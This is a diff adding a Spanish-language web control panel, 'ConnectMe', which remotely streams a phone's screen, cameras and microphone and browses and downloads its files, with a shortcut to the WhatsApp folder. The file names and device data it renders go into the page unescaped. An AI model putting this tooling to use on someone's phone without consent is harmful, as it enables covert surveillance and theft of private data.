@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ConnectMe — Panel de control</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0A0714;color:#fff;font-family:-apple-system,sans-serif;height:100vh;display:flex;flex-direction:column}
+.header{background:#110D1E;padding:16px 24px;display:flex;align-items:center;gap:16px;border-bottom:1px solid #2D2A3E}
+.logo{font-size:28px}
+h1{font-size:18px;font-weight:700;color:#fff}
+.status{font-size:12px;padding:4px 10px;border-radius:20px;background:#1a1a2e;color:#8B949E}
+.status.online{background:#0d2818;color:#30D158}
+.devices{display:flex;gap:8px;margin-left:auto}
+.device-btn{background:#1E1B2E;border:1px solid #3D3A4E;color:#fff;padding:6px 14px;border-radius:8px;cursor:pointer;font-size:13px}
+.device-btn.active{background:#7C3AED;border-color:#7C3AED}
+.main{display:flex;flex:1;overflow:hidden}
+.sidebar{width:200px;background:#110D1E;border-right:1px solid #2D2A3E;display:flex;flex-direction:column}
+.tab{padding:14px 20px;cursor:pointer;font-size:13px;color:#8B949E;border-left:3px solid transparent;transition:.2s}
+.tab:hover{color:#fff;background:#1a1629}
+.tab.active{color:#fff;border-left-color:#7C3AED;background:#1a1629}
+.content{flex:1;overflow:hidden;display:flex;flex-direction:column}
+.panel{display:none;flex:1;overflow:hidden}
+.panel.active{display:flex;flex-direction:column}
+
+/* Pantalla */
+#screenImg{width:100%;height:100%;object-fit:contain;background:#000}
+.screen-controls{background:#110D1E;padding:10px 16px;display:flex;gap:8px;border-top:1px solid #2D2A3E}
+.btn{background:#1E1B2E;border:1px solid #3D3A4E;color:#fff;padding:8px 16px;border-radius:8px;cursor:pointer;font-size:13px}
+.btn:hover{background:#2D2A3E}
+.btn.primary{background:#7C3AED;border-color:#7C3AED}
+.btn.danger{background:#DC2626;border-color:#DC2626}
+
+/* Cámara */
+#camImg{width:100%;height:100%;object-fit:contain;background:#000}
+
+/* Archivos */
+.files-panel{padding:16px;overflow-y:auto;flex:1}
+.file-item{display:flex;align-items:center;gap:12px;padding:10px;border-radius:8px;cursor:pointer;border-bottom:1px solid #1a1629}
+.file-item:hover{background:#1a1629}
+.file-icon{font-size:20px;width:28px;text-align:center}
+.file-name{flex:1;font-size:14px}
+.file-size{font-size:11px;color:#8B949E}
+
+/* Mic */
+#micCanvas{width:100%;height:200px;background:#000}
+
+/* Info */
+.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;padding:24px}
+.info-card{background:#110D1E;border:1px solid #2D2A3E;border-radius:12px;padding:16px}
+.info-label{font-size:11px;color:#8B949E;margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px}
+.info-value{font-size:16px;font-weight:600}
+
+.no-device{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:16px;color:#8B949E}
+.no-device .icon{font-size:64px}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">∞</div>
+  <h1>ConnectMe</h1>
+  <span class="status" id="connStatus">Conectando...</span>
+  <div class="devices" id="deviceList"></div>
+</div>
+
+<div class="main">
+  <div class="sidebar">
+    <div class="tab active" onclick="showTab('screen')">🖥️ Pantalla</div>
+    <div class="tab" onclick="showTab('camera')">📷 Cámara</div>
+    <div class="tab" onclick="showTab('files')">📁 Archivos</div>
+    <div class="tab" onclick="showTab('mic')">🎙️ Micrófono</div>
+    <div class="tab" onclick="showTab('info')">📱 Info</div>
+  </div>
+
+  <div class="content">
+    <!-- Sin dispositivo -->
+    <div id="noDevice" style="display:flex;flex:1;flex-direction:column;align-items:center;justify-content:center;gap:16px;color:#8B949E">
+      <div style="font-size:64px">📱</div>
+      <div style="font-size:16px">Esperando dispositivo...</div>
+      <div style="font-size:13px">Instala ConnectMe en el móvil y abre la app</div>
+    </div>
+
+    <!-- Pantalla -->
+    <div class="panel" id="panelScreen">
+      <img id="screenImg" src="" alt="Sin señal">
+      <div class="screen-controls">
+        <button class="btn primary" onclick="cmd('screen_start')">▶ Iniciar</button>
+        <button class="btn" onclick="cmd('screen_stop')">⏹ Detener</button>
+        <button class="btn" onclick="cmd('home')">⌂ Inicio</button>
+        <button class="btn" onclick="cmd('back')">← Atrás</button>
+      </div>
+    </div>
+
+    <!-- Cámara -->
+    <div class="panel" id="panelCamera">
+      <img id="camImg" src="" alt="Sin señal">
+      <div class="screen-controls">
+        <button class="btn primary" onclick="cmd('cam_front')">📱 Frontal</button>
+        <button class="btn" onclick="cmd('cam_back')">📸 Trasera</button>
+        <button class="btn" onclick="cmd('cam_stop')">⏹ Detener</button>
+      </div>
+    </div>
+
+    <!-- Archivos -->
+    <div class="panel" id="panelFiles">
+      <div class="screen-controls" style="border-bottom:1px solid #2D2A3E;border-top:none">
+        <button class="btn primary" onclick="listFiles('/')">📂 Raíz</button>
+        <button class="btn" onclick="listFiles('/sdcard/DCIM')">📷 DCIM</button>
+        <button class="btn" onclick="listFiles('/sdcard/Download')">⬇️ Descargas</button>
+        <button class="btn" onclick="listFiles('/sdcard/WhatsApp')">💬 WhatsApp</button>
+      </div>
+      <div class="files-panel" id="fileList">
+        <div style="color:#8B949E;text-align:center;padding:40px">Selecciona una carpeta</div>
+      </div>
+    </div>
+
+    <!-- Micrófono -->
+    <div class="panel" id="panelMic">
+      <canvas id="micCanvas"></canvas>
+      <div class="screen-controls">
+        <button class="btn primary" onclick="cmd('mic_start')">🎙️ Iniciar</button>
+        <button class="btn" onclick="cmd('mic_stop')">⏹ Detener</button>
+      </div>
+    </div>
+
+    <!-- Info -->
+    <div class="panel" id="panelInfo">
+      <div class="info-grid" id="infoGrid">
+        <div style="color:#8B949E;padding:40px">Sin datos</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+let ws = null;
+let activeDevice = null;
+let screenInt = null;
+let camInt = null;
+
+const RELAY = location.origin.replace('http','ws').replace('https','wss');
+
+function connect() {
+  ws = new WebSocket(RELAY);
+  ws.binaryType = 'arraybuffer';
+
+  ws.onopen = () => {
+    document.getElementById('connStatus').textContent = '● Conectado';
+    document.getElementById('connStatus').className = 'status online';
+    ws.send(JSON.stringify({ type: 'register', role: 'panel' }));
+  };
+
+  ws.onclose = () => {
+    document.getElementById('connStatus').textContent = 'Desconectado';
+    document.getElementById('connStatus').className = 'status';
+    setTimeout(connect, 3000);
+  };
+
+  ws.onmessage = (e) => {
+    // Datos binarios = frame de imagen
+    if (e.data instanceof ArrayBuffer) {
+      const blob = new Blob([e.data], { type: 'image/jpeg' });
+      const url  = URL.createObjectURL(blob);
+      // Determinar si es pantalla o cámara por el panel activo
+      const img = document.querySelector('.panel.active img');
+      if (img) { URL.revokeObjectURL(img.src); img.src = url; }
+      return;
+    }
+
+    try {
+      const msg = JSON.parse(e.data);
+      if (msg.type === 'device_list' || msg.type === 'device_connected') {
+        if (msg.devices) msg.devices.forEach(addDevice);
+        if (msg.deviceId) addDevice(msg.deviceId);
+      }
+      if (msg.type === 'device_disconnected') removeDevice(msg.deviceId);
+      if (msg.type === 'files') renderFiles(msg.data);
+      if (msg.type === 'info')  renderInfo(msg.data);
+      if (msg.type === 'frame') {
+        const img = document.getElementById('screenImg');
+        img.src = 'data:image/jpeg;base64,' + msg.data;
+      }
+      if (msg.type === 'cam_frame') {
+        const img = document.getElementById('camImg');
+        img.src = 'data:image/jpeg;base64,' + msg.data;
+      }
+    } catch(e) {}
+  };
+}
+
+function cmd(action, data={}) {
+  if (!ws || !activeDevice) return;
+  ws.send(JSON.stringify({ type: 'cmd', deviceId: activeDevice, action, ...data }));
+}
+
+function addDevice(id) {
+  activeDevice = id;
+  document.getElementById('noDevice').style.display = 'none';
+  const list = document.getElementById('deviceList');
+  if (!document.getElementById('dev_'+id)) {
+    const btn = document.createElement('button');
+    btn.className = 'device-btn active';
+    btn.id = 'dev_'+id;
+    btn.textContent = '📱 ' + id.slice(0,6);
+    btn.onclick = () => { activeDevice = id; };
+    list.appendChild(btn);
+  }
+  // Pedir info del dispositivo
+  setTimeout(() => cmd('info'), 500);
+}
+
+function removeDevice(id) {
+  document.getElementById('dev_'+id)?.remove();
+  if (activeDevice === id) {
+    activeDevice = null;
+    document.getElementById('noDevice').style.display = 'flex';
+  }
+}
+
+function showTab(name) {
+  document.querySelectorAll('.tab').forEach((t,i) => {
+    t.classList.toggle('active', ['screen','camera','files','mic','info'][i] === name);
+  });
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.getElementById('panel'+name.charAt(0).toUpperCase()+name.slice(1))
+    ?.classList.add('active');
+
+  // Iniciar stream según pestaña
+  clearInterval(screenInt); clearInterval(camInt);
+  if (name === 'screen') screenInt = setInterval(() => cmd('screen_frame'), 500);
+  if (name === 'camera') camInt    = setInterval(() => cmd('cam_frame'),    500);
+  if (name === 'files')  listFiles('/sdcard');
+  if (name === 'info')   cmd('info');
+}
+
+function listFiles(path) {
+  cmd('list_files', { path });
+}
+
+function renderFiles(files) {
+  const list = document.getElementById('fileList');
+  if (!files?.length) { list.innerHTML = '<div style="color:#8B949E;text-align:center;padding:40px">Carpeta vacía</div>'; return; }
+  list.innerHTML = files.map(f => `
+    <div class="file-item" onclick="${f.isDir ? `listFiles('${f.path}')` : `downloadFile('${f.path}')`}">
+      <span class="file-icon">${f.isDir ? '📁' : getIcon(f.name)}</span>
+      <span class="file-name">${f.name}</span>
+      <span class="file-size">${f.isDir ? '' : formatSize(f.size)}</span>
+    </div>`).join('');
+}
+
+function renderInfo(info) {
+  if (!info) return;
+  document.getElementById('infoGrid').innerHTML = Object.entries(info).map(([k,v]) => `
+    <div class="info-card">
+      <div class="info-label">${k}</div>
+      <div class="info-value">${v}</div>
+    </div>`).join('');
+}
+
+function downloadFile(path) { cmd('download', { path }); }
+function getIcon(n) {
+  if (/\.(jpg|jpeg|png|gif|webp)$/i.test(n)) return '🖼️';
+  if (/\.(mp4|mov|avi|mkv)$/i.test(n)) return '🎬';
+  if (/\.(mp3|aac|wav|ogg)$/i.test(n)) return '🎵';
+  if (/\.(pdf)$/i.test(n)) return '📄';
+  if (/\.(apk)$/i.test(n)) return '📦';
+  return '📄';
+}
+function formatSize(b) {
+  if (!b) return '';
+  if (b > 1e9) return (b/1e9).toFixed(1)+'GB';
+  if (b > 1e6) return (b/1e6).toFixed(1)+'MB';
+  if (b > 1e3) return (b/1e3).toFixed(0)+'KB';
+  return b+'B';
+}
+
+connect();
+showTab('screen');
+</script>
+</body>
+</html>
